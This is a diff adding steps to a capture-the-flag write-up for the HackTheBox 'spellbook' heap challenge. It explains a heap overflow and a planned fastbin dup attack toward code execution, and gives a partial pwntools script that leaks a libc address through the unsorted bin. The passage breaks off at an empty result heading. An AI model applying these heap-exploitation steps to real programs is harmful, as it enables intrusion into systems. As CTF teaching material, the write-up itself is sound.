@@ -56,3 +56,66 @@ Beware what you write inside this book. Have fun, if you are a true wizard after
 11. We can use an alternate way to leak libc address, by using this vuln.
 12. Now let's analyze the **edit()** function.
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/041c506d-dcb5-4d9a-a7af-dc716ce2aa05)
+
+
+13. Found a heap overflow vuln at the second input, remembering the smallest size of chunk we can allocate using malloc is 0x20 sized field. Hence if we allocate under 0x30 sized field and we edit the size of that chunk up to 0x30, we can overwrite metadata of chunk that are adjacent with it.
+14. Great! Seems we already identified all the vuln, our objective is to do fastbin attack (fastbindup) which lead to RCE.
+15. Let's start by writing the main arena's libc address to the unsorted bin. I allocate 0x200 chunk's size to make sure it outside of the fastbin range so it fell to unsorted bin when freed.
+
+> TEMPORARY SCRIPT
+
+```py
+from pwn import *
+import os
+os.system('clear')
+
+exe = './spellbook'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'INFO'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def malloc(index: int, input_type: bytes, size: int, data: bytes):
+    sh.sendlineafter(b'>> ', b'1')
+    sh.sendlineafter(b'entry: ', str(index))
+    sh.sendlineafter(b'type: ', input_type)
+    sh.sendlineafter(b'power: ', str(size))
+    sh.sendlineafter(b': ', data)
+
+def show(index: int):
+    sh.sendlineafter(b'>', b'2')
+    sh.sendlineafter(b':', f'{index}')
+
+def edit(index: int, input_type: bytes, data: bytes):
+    sh.sendlineafter(b'>> ', b'3')
+    sh.sendlineafter(b'entry: ', str(index))
+    sh.sendlineafter(b'type: ', input_type)
+    sh.sendlineafter(b': ', data)
+
+def free(index: int):
+    sh.sendlineafter(b'>> ', b'4')
+    sh.sendlineafter(b'entry: ', str(index))
+
+sh = start()
+
+malloc(0, b'A' * 8, 0x200, b'A' * 8)
+malloc(1, b'B' * 8, 0x68, b'B' * 8) # allocate another junk to prevent consolidation with the top chunk.
+
+free(0)
+show(0)
+
+gdb.attach(sh)
+
+sh.interactive()
+```
+
+> RESULT
+
